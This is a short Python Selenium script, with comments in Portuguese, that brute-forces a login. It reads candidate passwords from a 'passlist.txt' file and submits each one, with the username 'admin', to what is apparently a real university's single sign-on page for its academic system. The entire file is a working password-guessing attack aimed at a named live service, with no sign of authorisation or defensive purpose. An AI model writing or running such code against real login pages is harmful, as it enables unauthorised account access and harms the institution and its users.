from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys

count = 0

#Contagem de Linha
with open ('passlist.txt','r') as myfile:
    for line in myfile:
        count +=1

#Abrir Site e Arquivo
arquivo = open('passlist.txt', 'r')
driver = webdriver.Chrome('C:/Users/Deus.DEUS.002/Documents/IF-Informática Para Internet/chromedriver.exe')
driver.get('https://autenticacao.ufrn.br/sso-server/login?service=https%3A%2F%2Fsigaa.ufrn.br%2Fsigaa%2Flogin%2Fcas')
#Tentativas de Login
for i in range(count):
    linha = arquivo.readline()
    print(linha)
    Searchbar1 = driver.find_element_by_id('username')
    time.sleep(0.5)
    Searchbar1.send_keys('admin')
    Searchbar2 = driver.find_element_by_id('password')
    Searchbar2.send_keys(linha)
    time.sleep(2)
    Searchbar3 = driver.find_element_by_class_name('btn-login')
    Searchbar3.send_keys(Keys.ENTER)
    Searchbar1 = driver.find_element_by_id('username').clear()





